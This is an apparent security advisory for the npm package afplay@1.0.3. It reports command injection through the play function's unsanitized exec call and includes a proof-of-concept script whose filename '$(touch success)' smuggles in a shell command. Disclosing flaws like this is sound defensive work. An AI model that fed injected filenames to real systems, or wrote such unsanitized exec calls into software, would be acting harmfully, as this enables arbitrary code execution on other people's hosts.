# Vulnerability in afplay

This report details an ACI vulnerability affecting `afplay@1.0.3`.


## Package source

- https://www.npmjs.com/afplay


## Package description

"Apple Audio File Play wrapper for Node.js"


## Vulnerability Overview

Affected versions of this package are vulnerable to arbitrary command injection (CWE-77 [1]). If an attacker-submitted filename that contains an exploit payload is passed to the `play` function of the package, the attacker will be able to run arbitrary commands on the host system.

This vulnerability is due to use of the `child_process` `exec` function without input sanitization. The Node.js API documentation states that unsanitized user input should never be passed to `exec` [2].

[1] https://cwe.mitre.org/data/definitions/77.html

[2] https://nodejs.org/api/child_process.html#child_process_child_process_exec_command_options_callback


## Reproduction

The proof-of-concept (PoC) program below illustrates the issue. Executing this code will cause the command `touch success` to be executed, leading to the creation of a file called `success`.

### `poc.js`
```
var PUT = require('afplay');
var attackerFilename = "$(touch success)";
try {
	var put = new PUT();
	put.play(attackerFilename, {});
} catch (e) {
	console.log(e);
}
```

Environment: Node.js v15.5.1 on Linux

Steps to reproduce:
1. `npm i afplay@1.0.3`
2. Create a file, e.g., `poc.js`, containing the PoC code.
3. Execute the file: `node poc.js`

A file called `success` will be created as a result of the execution of the PoC.
